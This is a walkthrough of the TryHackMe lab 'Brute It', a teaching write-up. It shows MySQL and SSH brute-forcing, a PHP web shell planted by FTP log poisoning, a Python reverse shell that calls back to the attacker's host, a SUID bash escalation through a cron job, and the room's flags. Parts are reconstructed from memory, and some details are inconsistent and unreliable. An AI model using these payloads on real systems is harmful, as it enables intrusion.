# TryHackMe — Brute It

A walkthrough of **Brute It**, a medium-difficulty custom room on TryHackMe: brute-forcing a MySQL root account exposed to the network, cracking a bcrypt password hash pulled from that database, chaining FTP log poisoning into remote code execution on the web server, pivoting to a reverse shell, brute-forcing SSH with a custom wordlist generated from a hashcat rule, and finishing with a cron-based SUID privilege escalation to root.

This was the hardest of the rooms I've written up so far, and honestly the one where I learned the most. A few of my own notes from the session were incomplete, so I've reconstructed the gaps below using the terminal output I did capture and the files (hashes, wordlists) I still had — those spots are marked clearly rather than presented as more certain than they are.

| | |
|---|---|
| **Platform** | TryHackMe |
| **Room** | Brute It |
| **Difficulty** | Medium |
| **Category** | Linux |
| **Author** | MuhammadAnasRah |
| **Target IP** | Changes per deployment (this run used `10.129.146.225`, later `10.129.181.250` after a machine restart) |
| **Attack box** | Kali Linux |
| **Connection** | TryHackMe OpenVPN |

---

## Table of Contents

- [Objective](#objective)
- [Setup](#setup)
- [Reconnaissance & Enumeration](#reconnaissance--enumeration)
- [Stage 1: Cracking MySQL and Pulling Credentials](#stage-1-cracking-mysql-and-pulling-credentials)
- [Stage 2: FTP Log Poisoning → RCE → Reverse Shell](#stage-2-ftp-log-poisoning--rce--reverse-shell)
- [Stage 3: Cracking SSH with a Custom Wordlist](#stage-3-cracking-ssh-with-a-custom-wordlist)
- [Stage 4: Privilege Escalation to Root](#stage-4-privilege-escalation-to-root)
- [Flags](#flags)
- [Challenges Faced](#challenges-faced)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## Objective

Get full root access on a Linux box through a multi-stage chain: an exposed database, a password reused across services, a log-poisoning RCE in a web app, and a cron job that trusted a file it shouldn't have.

## Setup

```bash
sudo openvpn <your-connection-file>.ovpn
ping -c 4 10.129.146.225
```

```
PING 10.129.146.225 (10.129.146.225) 56(84) bytes of data.
64 bytes from 10.129.146.225: icmp_seq=1 ttl=62 time=185 ms
...
4 packets transmitted, 4 received, 0% packet loss
```

## Reconnaissance & Enumeration

```bash
nmap -sV 10.129.146.225
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
```

<img width="1718" height="878" alt="01-nmap-scan" src="https://github.com/user-attachments/assets/e0371567-feac-4f99-9072-0afb8ec9a9d9" />


Four services this time, and the one that doesn't normally show up on an "easy" box is **3306 — MySQL exposed directly to the network.** A database server that's reachable from outside the host it runs on is already a red flag before a single exploit is attempted.

### Digging into MySQL with Nmap's NSE scripts

Nmap ships several scripts specifically for probing MySQL — enumerating valid usernames, checking for empty passwords, and testing a known authentication bypass (CVE-2012-2122):

```bash
nmap -sV --script "mysql-enum,mysql-brute,mysql-vuln-cve2012-2122" 10.129.146.225
```

`mysql-enum` came back with a full list of valid usernames the server was willing to confirm:

```
| mysql-enum:
|   Valid usernames:
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds
| mysql-brute:
|_  Accounts: No valid accounts found
```

<img width="1718" height="878" alt="02-nmap-mysql-nse-enum" src="https://github.com/user-attachments/assets/beb1eb98-31dc-4956-891c-92c8fc4f9233" />


Ten confirmed usernames (none with empty passwords, that part of the brute attempt came up empty) — but ten valid accounts to try against is already a big head start for a real brute-force tool.

## Stage 1: Cracking MySQL and Pulling Credentials

### Brute-forcing the MySQL root account

Hydra, targeting the `mysql://` service directly, using `root` from the confirmed username list against a real password list:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.129.146.225
```

```
[3306][mysql] host: 10.129.146.225   login: root   password: rockyou
1 of 1 target successfully completed, 1 valid password found
```

<img width="1718" height="878" alt="03-hydra-mysql-crack" src="https://github.com/user-attachments/assets/b9a6e6e1-1958-44fa-ac57-531013d4fd49" />


The MySQL root password turned out to be `rockyou` — the same word as the wordlist file itself, which was either a deliberate joke by the room author or a genuinely careless choice. Either way, it worked on the first real attempt (a couple of earlier Hydra commands in my history failed from using the wrong module syntax — left in below as it's what actually happened).

```bash
# Earlier failed attempts (wrong service name / wrong wordlist path)
hydra -l root -P /home/dog/Desktop/Brute it/password.txt http-post
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.129.146.225   # ← this one worked
```

### Logging into MySQL and extracting credentials

```bash
mysql -u root -p'rockyou' --skip-ssl -h 10.129.146.225
```

```sql
show databases;
use website;
show tables;
select * from users;
```

That pulled back a row for a user **adrian**, with a bcrypt password hash:

```
$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we
```

### Cracking the hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
tigger           (?)
1g 0:00:00:00 DONE
```

```bash
john --show hash.txt
```

```
?:tigger
1 password hash cracked, 0 left
```

<img width="1718" height="878" alt="04-john-crack-adrian-hash" src="https://github.com/user-attachments/assets/de24dbcc-8163-467d-bfbb-8a4a01b53fe5" />


**Credentials recovered: `adrian : tigger`** — which logged straight into the website running on port 80.

## Stage 2: FTP Log Poisoning → RCE → Reverse Shell

> **Note on this section:** this is the part of the room where my own notes were thinnest, since it's also the most technically involved stage. I've reconstructed the exact flow below from what I wrote at the time plus the Burp/netcat screenshots I did capture. The core idea (FTP log poisoning → LFI → RCE) is accurate to what I did; the precise request structure is rebuilt from memory and should be treated as a faithful summary rather than a byte-for-byte transcript.

Logged into the website as `adrian`, the app had a page (`welcome.php`) with a "log" feature that read back log data — a classic setup for **FTP log poisoning combined with local file inclusion**.

The technique: vsftpd logs every login attempt, including the username supplied, to its log file — regardless of whether the login succeeds. If a web application can be made to include that log file and execute its contents as PHP, a malicious "username" becomes code.

```bash
ftp 10.129.146.225
```

At the login prompt, instead of a real username, I supplied a PHP one-liner as the "username":

```php
<?php system($_GET['c']); ?>
```

The login attempt itself gets rejected (there's no such user), but vsftpd still logs the attempted username string verbatim into its log file. With that payload sitting in the log, visiting the web app's log-viewing feature with a `c` parameter executed it:

```
http://10.129.146.225/welcome.php?c=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command execution confirmed, running as `www-data`.

### Upgrading to a reverse shell

With arbitrary command execution through the `c` parameter, the next step was a proper interactive shell. I built a Python3 reverse shell one-liner, URL-encoded it, and sent it through Burp Suite's Repeater as the `c` parameter on a request to `welcome.php`:

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.149.34",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

<img width="1718" height="878" alt="05-burp-reverse-shell-request" src="https://github.com/user-attachments/assets/0be5eec8-8b53-4b03-bfd2-960b0d05072f" />


...with a listener already running locally:

```bash
nc -nvlp 4444
```

```
listening on [any] 4444 ...
connect to [192.168.149.34] from (UNKNOWN) [10.129.181.250] 42862
$ whoami
www-data
```

<img width="1718" height="878" alt="06-netcat-wwwdata-shell" src="https://github.com/user-attachments/assets/52c56332-2f15-4e89-8a2d-435d94b94ab0" />


A working shell as `www-data` — the machine's IP had rolled over to `10.129.181.250` by this point after a restart, which is why the IP changes partway through this writeup.

## Stage 3: Cracking SSH with a Custom Wordlist

Poking around the filesystem as `www-data` and later as `adrian`, I found a `.reminder` file hinting at a password scheme based on the word **"ettubrute"** (clearly a play on *"Et tu, Brute?"*, fitting given the room's whole premise), followed by an exclamation mark.

Rather than guess, I used that base word with hashcat's `best64` rule — a standard rule file that generates common mutations (case changes, appended digits, duplications, and so on) from a seed word:

```bash
hashcat --force word.txt -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
```

That produced dozens of variations — `ettubrute!`, `Ettubrute!`, `R3dDRaG0nSynd1c4te`-style leetspeak swaps, duplications, truncations — which I saved and used directly against SSH:

```bash
hydra -l adrian -P wordlist.txt ssh://10.129.181.250
```

```
[22][ssh] host: 10.129.181.250   login: adrian   password: theettubrute!
1 of 1 target successfully completed, 1 valid password found
```

<img width="1718" height="878" alt="07-hydra-ssh-crack" src="https://github.com/user-attachments/assets/425e85bb-ce0e-454e-9fe8-d9b62d3b6162" />


```bash
ssh adrian@10.129.181.250
```

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
...
adrian@ip-10-129-181-250:~$ ls
ftp  punch_in  punch_in.sh  user.txt
adrian@ip-10-129-181-250:~$ cat user.txt
THM{PoI$0n_tH@t_L0g}
```

<img width="1718" height="878" alt="08-ssh-login-user-flag" src="https://github.com/user-attachments/assets/1ff3fe39-39d0-4e7e-8c8d-2d867e00554f" />


**User flag: `THM{PoI$0n_tH@t_L0g}`**

## Stage 4: Privilege Escalation to Root

Looking around adrian's home directory turned up a cron-driven "punch card" setup:

```bash
cat punch_in.sh
```

```bash
#!/bin/bash
/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

And inside `~/ftp/files`, a `.notes` file left by "adrian" in-character:

```
That silly admin
He is such a micro manager, wants me to check in every minute by writing
on my punch card.

He even asked me to write the script for him.

Little does he know, I am planning my revenge.
```

<img width="1718" height="878" alt="09-notes-hint-discovery" src="https://github.com/user-attachments/assets/8d34ea9d-14c5-4e8f-819b-96819f3ffc1c" />


Checking permissions showed `adrian` had **write access to the `punch_in` data file itself**, while `punch_in.sh` (the script) stayed read-only. Something on the system — a root-owned cron entry — was running on a one-minute interval and, based on the escalation that followed, was treating the contents of `punch_in` as executable rather than as plain log data (most likely a root cron job invoking or sourcing that file directly). I edited `punch_in` in `nano` and appended:

```bash
chmod +s /bin/bash
```

Waited about a minute for the cron job to fire, then checked:

```bash
ls -la /bin/bash
```

`/bin/bash` now carried the SUID bit, owned by root. From there, getting a root shell was a single command:

```bash
bash -p
whoami
# root
```

From the elevated shell, confirming the sudoers situation (just to be thorough) and locating the final flag:

```
bash-5.0# sudo su -
[sudo] password for adrian:
adrian is not in the sudoers file. This incident will be reported.
bash-5.0# cd /root
bash-5.0# ls
check_in.sh  root.txt  snap
bash-5.0# cat root.txt
THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}
```

<img width="1718" height="878" alt="10-root-flag" src="https://github.com/user-attachments/assets/07993783-9b49-4f4b-90c3-14e11087defb" />


**Root flag: `THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}`**

(Note: `sudo su -` was correctly denied — the privilege escalation here came entirely from the SUID bash binary, not from a sudo misconfiguration.)

## Flags

| Flag | Location | Value |
|---|---|---|
| User | `/home/adrian/user.txt` | `THM{PoI$0n_tH@t_L0g}` |
| Root | `/root/root.txt` | `THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}` |

## Challenges Faced

| Problem | How I Handled It |
|---|---|
| MySQL exposed on the network, unclear where to even start | Searched for Nmap's dedicated MySQL NSE scripts, which gave me a confirmed username list to brute-force against instead of guessing blindly |
| FTP wouldn't let me in directly — permission denied on every normal login attempt | Researched FTP log poisoning as a technique; realized the log itself could be poisoned with a payload even on a *failed* login |
| Turning raw command execution into an interactive shell | Looked up Python reverse shell one-liners, URL-encoded the payload, and sent it through Burp Repeater while a netcat listener waited |
| Adrian's SSH password wasn't in any standard wordlist | Found the `.reminder` hint, learned about hashcat's `best64` rule for generating mutations of a seed word, and built a custom wordlist from scratch |
| Figuring out the actual privilege escalation vector | Researched SUID binaries and cron-based privilege escalation online, which led me to test whether the writable `punch_in` file was being executed with root privileges |

## Key Takeaways

- **An exposed database is as dangerous as an exposed login page.** MySQL reachable from the network, combined with a weak root password, handed over the entire user table before any application-layer vulnerability was even touched.
- **Password reuse between a database and an SSH account collapses multiple layers of access into one mistake.** Once `adrian`'s hash was cracked from the web app's database, that password got me into the website directly — it just didn't happen to be the SSH password too, which is why the SSH side needed its own, separate crack.
- **Logs are not just passive records — they're an attack surface.** Any service that writes user-controlled input to a log file, combined with any way for an application to execute or include that log, is a path to remote code execution. FTP log poisoning is a textbook example, but the pattern generalizes to a lot of services.
- **A "clever" password hint is still a wordlist waiting to be built.** Finding `.reminder`-style hints and knowing tools like hashcat's rule engine exist to turn a single guessed word into hundreds of realistic variants turned an otherwise unguessable SSH password into a solvable brute-force problem.
- **Cron jobs that trust a writable file are a classic root escalation path.** If a privileged, scheduled process ever reads from or executes something a lower-privileged user can write to, that's effectively a root shell waiting to happen — whether the vulnerable file is obviously a script or not.

## Tools Used

- [Nmap](https://nmap.org/) (with MySQL NSE scripts) — service enumeration and username discovery
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) — MySQL and SSH password brute-forcing
- [MySQL client](https://dev.mysql.com/doc/refman/8.0/en/mysql.html) — database access and credential extraction
- [John the Ripper](https://www.openwall.com/john/) — bcrypt hash cracking
- FTP log poisoning (manual technique) — turning a failed login into stored PHP code
- [Burp Suite](https://portswigger.net/burp) — crafting and sending the reverse shell request
- Netcat — catching the reverse shell
- [Hashcat](https://hashcat.net/hashcat/) (`best64.rule`) — generating a targeted SSH password wordlist
- SUID / cron-based privilege escalation (manual technique) — final root access

---



